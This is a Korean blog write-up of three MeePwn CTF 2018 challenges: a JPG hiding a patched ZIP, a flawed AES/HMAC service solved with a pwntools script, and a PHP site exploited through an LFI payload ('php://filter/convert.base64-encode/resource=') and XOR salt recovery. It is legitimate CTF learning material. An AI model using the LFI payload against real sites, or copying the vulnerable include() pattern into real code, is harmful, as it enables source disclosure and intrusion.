---
title: "[MeePwn2018] WHITE SNOW, BLACK SHADOW / ESOR / EZCHALLZ Write up"
date: 2018-07-17
draft: false
category: [ctf]
subcategories: [2018]
tags: [Write-up, CTF, MeePwn2018]
---

지난 주말에 `MeePwn CTF`가 있었다.
다른 일이 있어 풀타임으로 참여하진 못했는데, 그래도 쉬운 몇 문제를 풀어 Write-up을 작성 해 보았다.  

<!--more-->

### [MISC] WHITE SNOW, BLACK SHADOW  

첫 번째로 풀어본 문제는 `WHITE SNOW, BLACK SHADOW` 문제이다.
문제 정보는 아래와 같다.  

```plain
Finally we caught the image in criminal communication.
But Holmes, why are they crying?
```

문제 정보와 함께 첨부 파일을 다운받을 수 있다.
파일을 다운받아 압축을 풀면 `evidence.jpg`라는 사진 파일을 하나 얻을 수 있다.  

![](/images/CTF/MeePwn2018/solved/meepwn_01.jpg)

사진에는 딱히 이상이 없어보여, `Hex Editor`를 사용 해 헥스 값을 확인 해 보았다.
파일의 첫 부분은 정상적인 `JPG` 파일의 헤더가 있었다.  

![](/images/CTF/MeePwn2018/solved/meepwn_02.png)

그런데 맨 마지막 부분에서 아래와 같이 `message.pdf`라는 문자열과 `PK`가 있는 것을 찾을 수 있었다.  

![](/images/CTF/MeePwn2018/solved/meepwn_03.png)

`PK`라는 파일 헤더를 어딘가에서 본 기억이 나 인터넷에 검색을 해 보았더니 `ZIP` 파일의 헤더라는 것을 알 수 있었다.  

![](/images/CTF/MeePwn2018/solved/meepwn_04.png)

사진과 같이, `ZIP` 파일의 헤더는 `50 4b 03 04`로 시작하게 된다.
사진 파일에서 `ZIP` 파일을 추출하기 위해, `50 4b 03 04`를 찾아 보았다.
그런데 찾아보니 `50 4b 05 06`은 있었지만 `50 4b 03 04`는 찾을 수 없었다.  

![](/images/CTF/MeePwn2018/solved/meepwn_05.png)

아마도 파일 헤더를 살짝 수정해 둔 것 같았다.
그래서 `evidence.jpg` 파일에서 `50 4b 05 06`을 `50 4b 03 04`로 패치해 준 뒤, `WinHex` 라는 툴을 이용 해 파일을 추출 해 보았다.  

![](/images/CTF/MeePwn2018/solved/meepwn_06.png)

그 결과 다음과 같이 압축 파일을 추출할 수 있었고, 압축 파일 안에는 `message.pdf` 파일이 있었다.
message.pdf의 내용은 다음과 같다.  

```plain
“When you have eliminated the impossible, whatever remains, however improbable, must be the truth.”

– Sir Arthur Conan Doyle

What does that mean?
To me, this is all about logic. If you start with everything you can think of, and then eliminate those that are impossible, you are well on your way to a solution. That’s the first stage of solving any mystery, whether it’s a murder mystery in a book (or TV, or movie, or…) or somethingMeeyou expected to work, but didn’t. You have to eliminate all the things that it couldn’t possibly be, or you will have too many distractions. 

Once we clear out all the distractions, we can focus on what remains. Sometimes what is left is easy to believe, other times it can seem highly improbable. However, with the impossible eliminated, whatPwnremains are the only possible solutions. And oneCTFof them must be the truth.

Why is clearing out the impossible solutions important?
Sometimes, it can be hard to solve a{T3challenging situation even under the best of circumstances. A problem with lotsxt_of shiny things to look at can be distracting, and waste a great deal of our time.
While some impossibilities might be obvious, sometimesUndwe can be sucked in by an idea that3r_intrigues us, despite being impossible. Other times, it is only in close examination that the impossibility is revealed.

However, once we clear the clutter by removing all that is impossible, we are left with an easier solution. Gone are the impossibilities, botht3Xobvious and subtle. What is left can be gone over more quickly, and evaluated for probability or even likelihood.

This may be an iterative process, starting with the really obvious impossibilities, and then moving to the shiny distractions. Finally, as wet!!!!}work our way through the last of the options, we may still find ourselves weeding out additional impossibilities.
```

처음엔 딱히 이상한 점을 못느꼈는데, 자세히 읽어보니 띄어쓰기가 있어야 하는 부분에 문자열이 조금씩 들어있는 것을 발견할 수 있었다.  

> ex) or something`Mee`you expected to work,

문장을 하나하나 읽어보며 띄어쓰기가 있어야 하는 자리에 들어 있는 문자열을 잘라 이어보면 flag를 완성할 수 있다.  

```plain
FLAG : MeePwnCTF{T3xt_Und3r_t3Xt!!!!}
```

---

### [CRYPTO] ESOR

문제 정보는 다음과 같다.  

```plain
Howdy, howdy...
nc 206.189.92.209 12345
```

또한 함께 아래와 같은 파이썬 코드를 준다.  

```python
#!/usr/bin/python2
from Crypto.Cipher import AES
import hmac, hashlib
import os
import sys

menu = """Choose one:
1. encrypt data
2. decrypt data
3. quit
"""

class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)

sys.stdout = Unbuffered(sys.stdout)
sys.stderr = None

encrypt_key = '\xff' * 32
secret = 'MeePwnCTF{#flag_here#}'
hmac_secret = ''
blocksize = 16
hmac_size = 20

def pad(msg):
	padlen = blocksize - (len(msg) % blocksize) - 1
	return os.urandom(padlen) + chr(padlen)

def unpad(msg):
	return msg[:-(ord(msg[-1]) + 1)]

def compute_hmac(msg):
	return hmac.new(hmac_secret, msg, digestmod=hashlib.sha1).digest()

def encrypt(prefix='', suffix=''):
	_enc = prefix + secret + suffix
	_enc+= compute_hmac(_enc)
	_enc+= pad(_enc)
	iv = os.urandom(16)
	_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)
	return (iv + _aes.encrypt(_enc)).encode('hex')

def decrypt(data):
	data = data.decode('hex')
	try:
		iv = data[:blocksize]
		_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)
		data = _aes.decrypt(data[blocksize:])
		data = unpad(data)
		plaintext = data[:-hmac_size]
		mac = data[-hmac_size:]
		if mac == compute_hmac(plaintext): return True
		else: return False
	except: return False

print """Welcome to our super secure enc/dec server. 
We use hmac, so, plz don't hack us (and you can't). Thanks."""

while True:
	choice = int(raw_input(menu))
	if choice == 1:
		_pre = raw_input('prefix: ')
		_suf = raw_input('suffix: ')
		print encrypt(prefix=_pre, suffix=_suf)
	elif choice == 2:
		_data = raw_input('data: ')
		if decrypt(_data):
			print 'OK'
		else:
			print 'KO'
	elif choice == 3:
		sys.exit(0)
	else:
		choice = int(raw_input(menu))
```

서버에 실제로 저장되어 있는 `secret`의 값을 찾아야 하는 문제이다.
nc를 통해 문제에 접속하면 아래와 같다.  

```sh
$ nc 206.189.92.209 12345
Welcome to our super secure enc/dec server. 
We use hmac, so, plz don't hack us (and you can't). Thanks.
Choose one:
1. encrypt data
2. decrypt data
3. quit
1
prefix: aaa
suffix: bbb
d9d860ba5708b4758a95b84b99459683dde5d09d8a137f2d436cf6b42d3519b3eb5642f9802c5957c867f0d83505462aa9f5d6024238c8618cff0832a15913446e0ff402ffb874968b2ce4b960e37517b557f32570ead1b3cd8e8ff6bf1a907b
Choose one:
1. encrypt data
2. decrypt data
3. quit
2
data: d9d860ba5708b4758a95b84b99459683dde5d09d8a137f2d436cf6b42d3519b3eb5642f9802c5957c867f0d83505462aa9f5d6024238c8618cff0832a15913446e0ff402ffb874968b2ce4b960e37517b557f32570ead1b3cd8e8ff6bf1a907b
OK
Choose one:
1. encrypt data
2. decrypt data
3. quit
```

`encrypt data`, `decrypt data`, `quit` 3 개의 메뉴가 있고, `encrypt data`를 선택 할 경우 `prefix`와 `suffix`를 입력 해 주어야 한다.
또한 `decrypt data`를 선택 할 경우에는 복호화 할 데이터를 입력받고 복호화 성공 시 `OK`를, 복호화를 실패 할 경우에는 `KO`를 출력 해 준다.
소스코드를 확인 해 보면 `decrypt` 함수를 제공 해 주었으며, `encrypt_key`가 `0xff * 32`로 되어 있다.
그래서 혹시나 해서 다음과 같이 제공해 준 `decrypt` 함수를 바탕으로 exploit 코드를 짠 후 돌려 보았다.  

```python
#!/usr/bin/python2
from Crypto.Cipher import AES
import hmac, hashlib
import os
import sys
from pwn import *

class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)

sys.stdout = Unbuffered(sys.stdout)
sys.stderr = None

encrypt_key = '\xff' * 32
hmac_secret = ''
blocksize = 16
hmac_size = 20

def unpad(msg):
	return msg[:-(ord(msg[-1]) + 1)]

def compute_hmac(msg):
	return hmac.new(hmac_secret, msg, digestmod=hashlib.sha1).digest()

def decrypt(data):
	data = data.decode('hex')
	try:
		iv = data[:blocksize]
		_aes = AES.new(encrypt_key, AES.MODE_CBC, iv)
		data = _aes.decrypt(data[blocksize:])
		data = unpad(data)
		plaintext = data[:-hmac_size]
		mac = data[-hmac_size:]
		if mac == compute_hmac(plaintext):
			print plaintext
			return True
		else: return False
	except: return False

print "[+] ESOR exploit start"

s = remote("206.189.92.209", 12345)

print "[+] Connect OK with ESOR" 

s.recvuntil("3. quit")

s.sendline("1")

s.recvuntil("prefix: ")
s.sendline("aaa")
s.recvuntil("suffix: ")
s.sendline("bbb")

recv_data = s.recvuntil("3. quit")

data = recv_data.split("Choose one:")[0][:192]

print data

print "[+] Check Encrypted data OK"

decrypt(data)
```

nc로 접속한 후, 암호화 된 데이터를 받아 제공해 준 `decrypt` 함수를 사용 해 복호화 한 후 `print plaintext`만 추가 해 주었다.
그 결과 앞 뒤로 내가 입력 한 `prefix`와 `suffix`가 있는 flag를 얻을 수 있었다.  

```plain
FLAG : MeePwnCTF{pooDL3-this-is-la-vie-en-rose-P00dle!}
```

아무래도 이 문제는 출제자가 잘못 낸 문제같다.
flag의 내용으로 추측하건데, 아마도 `POODLE` 공격을 해야하는 문제가 아니었나 싶다.
그런데, 오늘 다시 코드를 돌려보니 이제는 문제가 풀리지 않았다.
대회 도중 출제자가 잘못된 것을 깨닫고 문제를 수정한 것 같다.
~~IRC는 모르겠지만 홈페이지에는 공지가 없었다... 잠수함 패치 잼...~~

---

### [CRYPTO] EZCHALLZ

문제 정보는 아래와 같다.  

```plain
http://206.189.92.209/ezchallz/
```

홈페이지에 접속 해 보면 아래와 같은 화면만 있다.  

![](/images/CTF/MeePwn2018/solved/meepwn_07.png)

`Homepage`와 `Free register`, 딱 두개의 메뉴만 있을 뿐이었다.
`Homepage`를 누르면 위와 동일한 화면이 나타난다.
`Free register`를 누를 경우에는 아래와 같이 값을 입력할 수 있으며, `Register` 버튼을 누르면 가짜 flag를 출력 해 준다.  

![](/images/CTF/MeePwn2018/solved/meepwn_08.png)

![](/images/CTF/MeePwn2018/solved/meepwn_09.png)

소스코드를 봐도 딱히 눈에 띄는것이 없어 `URL`을 살펴 보았다.
각각 버튼을 누를 경우 이동하는 URL은 다음과 같다.  

> Homepage를 누를 경우 : http://206.189.92.209/ezchallz/index.php  
> Free register를 누를 경우 : http://206.189.92.209/ezchallz/index.php?page=register  
> 값 입력 후 Register 버튼을 누를 경우 : http://206.189.92.209/ezchallz/users/b8240bb93fb5c4321196ff675b7f98eb/flag.php  

쿼리 스트링에서 `page`를 인자로 받아 페이지를 이동한다는 것을 알 수 있었다.
그런데 이 경우 `LFI` 공격에 취약할 수 있다.
`page`의 값에 다음과 같이 입력한다면, 해당 파일의 내용을 읽을 수 있다.  

```plain
?page=php://filter/convert.base64-encode/resource=index
```

그 결과 아래와 같이 `base64`로 인코딩 된 소스코드를 얻을 수 있었다.  

![](/images/CTF/MeePwn2018/solved/meepwn_10.png)

`index`와 `register` 페이지의 소스코드를 얻어 `base64`로 디코딩 하면 아래와 같다.  

* index.php

```php
<html>
<a href="index.php">Homepage</a>
<a href="?page=register">Free register</a></li>

<?php
if(isset($_GET["page"]) && !empty($_GET["page"])) {
    $page = $_GET["page"];
    if(strpos(strtolower($page), 'secret') !== false) {
        die('No no no!');
    }
//    else if(strpos($page, 'php') !== false) {
 //       die("N0 n0 n0!");
//    }
    else {
        include($page . '.php');
    }
}
?>
</html>
```

* register.php

```php
<html>
<?php
error_reporting(0);

function gendirandshowflag($username) {
	include('secret.php');
	$dname = "";
	$intro = "";
	$_username = md5($username, $raw_output = TRUE);
	for($i = 0; $i<strlen($salt); $i++) {
		$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));
	};
	$dname = "users/" . bin2hex($dname);
	echo 'You have successfully register as ' . $username . '!\n';
	if ($_username === hex2bin('21232f297a57a5a743894a0e4a801fc3')) {
		$intro = "Here is your flag:" . $flag;
	}
	else {
		$intro = "Here is your flag, but I'm not sure 🤔: \nMeePwnCTF{" . md5(random_bytes(16) . $username) . "}";
	}
	mkdir($dname);
	file_put_contents($dname . '/flag.php', $intro);
	header("Location: ". $dname . "/flag.php");
}

if (isset($_POST['username'])) {
	if ($_POST['username'] === 'admin') {
		die('Username is not allowed!');
	}
	else {
		gendirandshowflag($_POST['username']);
	}
}
?>

        <form action="?page=register" method="POST">
        <input type="text" name="username"><br>
        <input type="submit" value="Register">
        </form>
</html>
```

소스코드를 분석해 본 결과, username의 md5 해쉬 값이 `21232f297a57a5a743894a0e4a801fc3`라면 진짜 flag를 `$dname/flag.php`에 저장하는 것을 알 수 있었다.
즉, md5 해쉬 값이 `21232f297a57a5a743894a0e4a801fc3`인 username을 찾아 해당 `username`의 `$dname`을 구해 `$dname/flag.php`에 들어가면 flag를 얻을 수 있다.
`$dname`을 만드는 코드는 다음과 같다.  

```php
for($i = 0; $i<strlen($salt); $i++) {
	$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));
};
```

따라서 `$dname`을 만들기 위해서는 `$salt`의 값과 `$_username`의 값을 알아야 한다.
인터넷의 해쉬 값을 크랙해 주는 사이트에서 `21232f297a57a5a743894a0e4a801fc3`의 평문은 `admin`이라는 것을 알아내어, `$_username`은 `admin`이라는 것을 알 수 있었다.  

문제는 `$salt` 값인데, 변수를 새로 선언도 안한 것으로 보아 `$salt`의 값은 `secret.php`에 있는 것 같다.
하지만 `index.php`에서 `secret`라는 문자에 대한 필터링을 걸어 두었으므로, `secret.php`의 소스코드는 알아낼 수 없다.
그렇지만 `$dname`을 만들 때 `XOR` 연산을 사용하며, 홈페이지에서 내가 입력한 값을 바탕으로 만들어 지는 `$dname`의 값을 확인할 수 있다.  

따라서 이를 역 연산하면 `$salt`의 값을 알아낼 수 있다.
`$salt`의 값을 구하고, `admin`의 `$dname`을 구하기 위해 아래와 같이 소스코드를 구현 했다.  

```php
<?php
	$_username = md5("test", $raw_output = TRUE);

	$_dname = hex2bin("b8240bb93fb5c4321196ff675b7f98eb");

	$salt = "";

	for($i; $i < strlen($_username); $i ++) {
		$salt .= chr(ord($_dname[$i]) ^ ord($_username[$i]));
	}

	$_username = md5("admin", $raw_output = TRUE);
	$dname = "";

	for($i = 0; $i < strlen($_username); $i ++) {
		$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));
    }
	echo bin2hex($dname);
?>
```

그 결과 `90884f5d03c3b2e698c1fbea37d833de`라는 `$dname` 값을 구할 수 있었다.
`90884f5d03c3b2e698c1fbea37d833de/flag.php`로 접속 해 주석을 확인 해보면 flag를 얻을 수 있다.  

![](/images/CTF/MeePwn2018/solved/meepwn_11.png)

```plain
FLAG : MeePwnCTF{just-a-warmup-challenge-are-you-ready-for-hacking-others-challz?}
```
